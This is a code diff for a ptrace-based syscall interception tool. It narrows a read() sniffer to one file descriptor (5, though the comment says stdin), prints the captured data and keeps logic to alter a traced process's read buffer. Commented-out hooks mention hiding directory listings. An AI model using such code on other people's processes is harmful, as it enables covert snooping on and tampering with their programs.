@@ -252,21 +252,25 @@ int syscall_execve(int pid, struct user_regs_struct regs) {
 char *syscall_read(int pid, struct user_regs_struct regs) {
 	static in_syscall;
 	static int fd;
-	int len;
+	unsigned int len;
 	static long str_addr;
 	char *sniffed= (char *)malloc(1000);
 	if(in_syscall == 0) {
 	    fd=ptrace(PTRACE_PEEKUSER, pid, EBX*4, 0); // get FD #
-	    //if(fd == 0) { // stdin
+	    if(fd == 5) { // stdin
 		str_addr = ptrace(PTRACE_PEEKUSER, pid, ECX*4,0); // get str_addr	
 		len = regs.edx;
-	    //}
+	    }
+	    else {
+		str_addr = 0;
+	    }
 	    in_syscall = 1;
 	}
 	else {
 	    if(regs.eax > 0) {
+		if(str_addr == 0) { return 0; } // not our selected FD!
 		getdata(pid, str_addr, (char *)sniffed, regs.eax);  // eax has the read len
-		printf("read(%d,\"%s\", %d)!\n", fd, sniffed,len);
+		printf("%d = read(%d,\"%s\", %u)!\n", regs.eax, fd, sniffed,len);
 		// attempting to modify processes returned read buffer ;) should be SLOW
 		if(strstr(sniffed, "redirect me") != NULL) {
 		    printf("found key attempting to modify return value...\n");
@@ -361,7 +365,7 @@ int hookem(int pid) {
 		ptrace(PTRACE_GETREGS, pid, 0, &regz);
 		switch (regz.orig_eax) {
 //			case __NR_stat64: syscall_stat64(pid,regz); break; // various
-			case __NR_open: syscall_open(pid,regz); break; // various
+			//case __NR_open: syscall_open(pid,regz); break; // various
 //			case __NR_getdents64: syscall_getdents64(pid,regz); break; // HIDE :D
 			// case __NR_fork: syscall_fork(pid,regz); break; // to follow procs -- this needs to be clone()
 			case __NR_clone: 
